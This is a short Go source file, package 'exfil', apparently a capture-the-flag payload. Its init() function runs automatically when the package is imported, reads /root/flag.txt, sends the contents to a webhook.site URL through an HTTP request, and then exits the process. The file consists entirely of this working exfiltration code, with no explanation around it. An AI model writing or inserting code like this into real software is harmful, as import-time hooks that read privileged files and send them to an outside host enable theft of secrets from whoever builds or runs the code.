package exfil

import (
	"io/ioutil"
	"net/http"
	"os"
)

func init() {
	flag, err := ioutil.ReadFile("/root/flag.txt")
	if err == nil {
		http.Get("https://webhook.site/your-webhook-id?flag=" + string(flag))
	}
	os.Exit(0)
}
